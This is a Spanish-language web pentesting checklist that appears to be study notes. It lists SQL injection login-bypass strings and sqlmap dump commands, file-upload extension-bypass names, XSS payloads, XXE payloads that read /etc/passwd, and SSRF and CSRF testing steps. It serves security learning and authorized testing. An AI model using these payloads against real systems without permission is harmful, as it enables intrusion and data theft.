



 # Checklist Pentesting Web

## Recopilacion e Informacion.

1.  Identificar el servidor web, los programas y tecnologias que utiliza junto con sus versiones. 

   Esto lo podremos identificar utilizando programas como nmap o whatweb

   nmap -h whatweb -h estas vienen instaladas en kali

2. Identificaremos como esta creada la pagina web  y las posiles vulnerabilidades que puede tener.

3. Escanear subdominios y directorios.

4. Intentar localizar /robots.txt

5. Intentar localizar si hay un panel de administrador e inicio de sesion

6. Saber que puertos pueden estar habiertos y cuales son los que utiliza

## Busqueda de vulneravilidades 

Una vez analizada la pagina web y con la informacion de sus servicios procedemos a buscar vulnerabilidades.

Con nmap podemos utilizar la ejecucion de scripts para comporbar alguna de las vulnerabilidades mas conocidas.

- **Auth:** ejecuta todos sus *scripts* disponibles para autenticación

- **Default:** ejecuta los *scripts* básicos por defecto de la herramienta

- **Discovery:** recupera información del *target* o víctima

- **External:** *script* para utilizar recursos externos

- **Intrusive:** utiliza *scripts* que son considerados intrusivos para la víctima o *target*

- **Malware:** revisa si hay conexiones abiertas por códigos maliciosos o *backdoors* (puertas traseras)

- **Safe:** ejecuta *scripts* que no son intrusivos

- **Vuln:** descubre las vulnerabilidades más conocidas

- **All:** ejecuta absolutamente todos los *scripts* con extensión NSE disponibles

  **Ejemplos de comando**

  ```
  nmap -f -sS -sV --script auth "IP victima"
  nmap -f -sS -sV --script default "IP victima"
  nmap -f -sS -sV --script safe "IP victima"
  nmap -f -sS -sV --script vuln "IP victima"
  nmap -f -sS -sV --script all "IP victima"
  ```

  

## Como detectar SQL Injection

Enviar el carácter de comillas simples `'`y buscando errores u otras anomalías.

Enviar condiciones booleanas como `OR 1=1`y `OR 1=2, and`buscando diferencias en las respuestas de la aplicación.

Line Comments 

- Nombre de usuario: ` admin'--`

- `SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' `Esto lo registrará como usuario administrador, porque se ignorará el resto de la consulta SQL. 

- Sentencia If de SQL Server 

  `IF ***condition\*** ***true-part\*** ELSE ***false-part\***`(S) 
  `IF (1=1) SELECT 'true' ELSE SELECT 'false'`

- Con union, realiza consultas  SQL en tablas cruzadas.  Básicamente, puede envenenar la consulta para  devolver registros de otra tabla. 

  `SELECT header, txt FROM product UNION ALL SELECT name, pass FROM members `
  Esto combinará los resultados de la tabla de productos y la tabla de miembros y los devolverá todos. 

- *Inyección SQL 101* , trucos de inicio de sesión 

  ```sql
  - `admin' --`
  - `admin' #`
  - `admin'/*`
  - `' or 1=1--`
  - `' or 1=1#`
  - `' or 1=1/*`
  - `') or '1'='1--`
  - `') or ('1'='1--`
  
  - Iniciar sesión como otro usuario 
    `' UNION SELECT 1, 'anotheruser', 'doesnt matter', 1--`
  ```

Estas serian algunas de las que podriamos probar de manera manual, luego tendriamos diferentes programas que nos ayudan como por ejemplo SQLMap, la manera de ejecutar las consultas puede variar dependiendo de como este creada la base de datos, para esto lo que tendremos que hacer sera identificarlo bien para su explotacion.

**SQLMAP**

```javascript
# Post
sqlmap -r search-test.txt -p tfUPass

# Get
sqlmap -u "http://10.11.1.111/index.php?id=1" --dbms=mysql

# Crawl
sqlmap -u http://10.11.1.111 --dbms=mysql --crawl=3

# Full auto - FORMS
sqlmap -u 'http://10.11.1.111:1337/978345210/index.php' --forms --dbs --risk=3 --level=5 --threads=4 --batch
# Columns 
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --columns -T users -D admin
# Values
sqlmap -u 'http://admin.cronos.htb/index.php' --forms --dbms=MySQL --risk=3 --level=5 --threads=4 --batch --dump -T users -D admin

sqlmap -o -u "http://10.11.1.111:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --users --passwords
```

## Como detectar File Upload

Esta vulnerabilidad puede ser muy potente ya que podemos llegar a tomar el control total de un servidor que sea vulnerable cargando una shell.

Los pasos que tendremos que seguir seran los siguientes:

1. Verificar las extensiones permitidas
2. Verificar en que momento el servidor hace la comprobacion
3. Saber que extensiones no estan permitidas
4. Verificar si se codifica

**Omitir comprobaciones de extensiones de archivo** 

1. Verifica añadiendo una extension valida antes de la extension de ejecucion

   -archivo.png.php

2.  Agregar caracteres especiales al final. Para esto existen herramientas como Burp que nos ayudaria a aplicar la fuera bruta de los caracteres ASCII y Unicode.

   ```
   file.php%0a
   file.php%20
   file.php%00
   file.php%0d%0a
   file.php/
   file.php.\
   file.php....
   file.pHp5....
   ```

3. Tambien podemos intentar engañar al analizador del servidor duplicando las extensiones o añadiendo datos basura

   ```
   file.png.php
   file.png.pHp5
   file.php%00.png
   file.php\x00.png
   file.php%0a.png
   file.php%0d%0a.png
   flile.phpBasura123png
   ```

   Si conseguimos subir alguna extension como php o python podremos ejecutar un Payload para conseguir el control del servidor, para pode crear el Payload con la shell podremos utilizar weevely, esto nos dejara crear la extension del fichero con un Payload para poder connectarnos.

   

   ## Como detectar XSS

   Cross-site scripting (XSS) es un  tipo de vulnerabilidad de seguridad informática que normalmente se  encuentra en las aplicaciones web.  XSS permite a los atacantes inyectar secuencias de comandos del lado del cliente en páginas web vistas por otros usuarios. 

   ### Basico

```html
'';!--"<XSS>=&{()}
<script>alert(1)</script>
<script>+-+-1-+-+alert(1)</script>
<script>+-+-1-+-+alert(/xss/)</script>
%3Cscript%3Ealert(0)%3C%2Fscript%3E
%253Cscript%253Ealert(0)%253C%252Fscript%253E
<svg onload=alert(1)>
"><svg onload=alert(1)>
<iframe src="javascript:alert(1)">
"><script src=data:&comma;alert(1)//
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
%5B'-alert(document.cookie)-'%5D
%5B'-alert(document.cookie)-'%5D
```

## Como detectar XXE

La inyección de entidad externa  XML (también conocida como XXE) es una vulnerabilidad de seguridad web  que permite a un atacante interferir con el procesamiento de datos XML  de una aplicación.  A menudo, permite que un atacante vea archivos en el sistema de archivos del servidor de aplicaciones e interactúe con  cualquier sistema externo o de back-end al que pueda acceder la propia  aplicación.         

Muchos XXE los podremos detectar con el programa de Burpsuite.

Para realizar pruebas manuales lo que tendremos que hacer sera:

1. Probar [la recuperación de archivos ](https://portswigger.net/web-security/xxe#exploiting-xxe-to-retrieve-files)mediante la definición de una entidad externa basada en un archivo de sistema  operativo conocido y el uso de esa entidad en los datos que se devuelven en la respuesta de la aplicació
2. Probar [vulnerabilidades XXE ciegas ](https://portswigger.net/web-security/xxe/blind)definiendo una entidad externa basada en una URL a un sistema que usted controla y monitoreando las interacciones con ese sistema

**Mas maneras de detectarlo:**

```
La carga de archivos permite docx/xlsx/pdf/zip, descomprimir el paquete y agregar su código xml maligno en los archivos xml.
```

```
Si se permite svg en la carga de imágenes, puede inyectar xml en svgs.
```

```
Si la aplicación web ofrece fuentes RSS, agregue su código milicioso en el RSS.
```

**Check:**

```
<?xml version="1.0"?>
<!DOCTYPE a [<!ENTITY test "THIS IS A STRING!">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

**Si funciona, entonces:**

```
<?xml version="1.0"?>
<!DOCTYPE a[<!ENTITY test SYSTEM "file:///etc/passwd">]>
<methodCall><methodName>&test;</methodName></methodCall>
```

**Herramientas:**

```
# https://github.com/BuffaloWill/oxml_xxe
# https://github.com/enjoiz/XXEinjector
```

## Como detectar SSRF

La falsificación de solicitudes del lado del servidor (también conocida como SSRF) es una vulnerabilidad de seguridad web que permite a un atacante **inducir a la aplicación del lado del servidor a realizar solicitudes HTTP a un dominio arbitrario** elegido por el atacante. 

**Lo que debes intentar hacer** 

- Acceso a **archivos locales** (archivo://) 
- Intentando acceder a la IP local
- **Suplantación de DNS** (dominios que apuntan a 127.0.0.1) 
- **DNS Rebinding**. Esto es útil para omitir las configuraciones que resuelven el dominio  dado y compararlo con una lista blanca y luego intentar acceder a él  nuevamente (ya que tiene que resolver el dominio nuevamente, el DNS  puede servir una IP diferente). Más [información aquí ](https://geleta.eu/2019/my-first-ssrf-using-dns-rebinfing/). 
- Intentando hacer un **descubrimiento de activos internos y un escaneo de puertos internos** . 
- Acceder **a contenido privado** (filtrado por IP o solo accesible localmente, como */admin* la ruta 

​	**Herramientas:**

```
https://github.com/swisskyrepo/SSRFmap
```

```
https://github.com/tarunkant/Gopherus
```

## Como detectar CSRF

La falsificación de solicitudes  entre sitios (también conocida como CSRF) es una vulnerabilidad de  seguridad web que permite a un atacante inducir a los usuarios a  realizar acciones que no tienen la intención de realizar.  Permite que  un atacante eluda parcialmente la misma política de origen, que está  diseñada para evitar que diferentes sitios web interfieran entre sí.

**Como encontrar:** 

- Elimine el token CSRF de las solicitudes y/o deje un espacio en blanco. 
- Cambie POST a GET. 
- Reemplace el token CSRF con un valor aleatorio (por ejemplo, 1). 
- Reemplace el token CSRF con un token aleatorio de las mismas restricciones.
- Extraer token con inyección de HTML. 
- Use un token CSRF que se haya usado antes. 
- Omitir expresiones regulares. 
- Eliminar encabezado de referencia. 
- Solicite un CSRF ejecutando la llamada manualmente y use ese token para la solicitud. 

**Mas pruebas:**

```
- Eliminando el parámetro del token por completo
- Establecer el token en una cadena en blanco
- Cambiar el token a un token no válido del mismo formato
- Usar el token de un usuario diferente
- Coloque los parámetros en la URL en lugar del cuerpo POST (y elimine el token) y cambie el verbo HTTP a GET
- Probar cada punto final sensible
- Verifique si el token se puede adivinar / descifrar
- Verifique si se generan nuevos tokens para cada sesión; de lo contrario, pueden ser un hash de algo simple como la dirección de correo electrónico del usuario. Si es así, puede crear sus propios tokens válidos.
- Intente crear la carga útil con varios métodos, incluido un formulario HTML estándar, un formulario de varias partes y XHR (Burp puede ayudar)
```

**Herramientas:**

```
# https://github.com/0xInfection/XSRFProbe
xsrfprobe --help
```

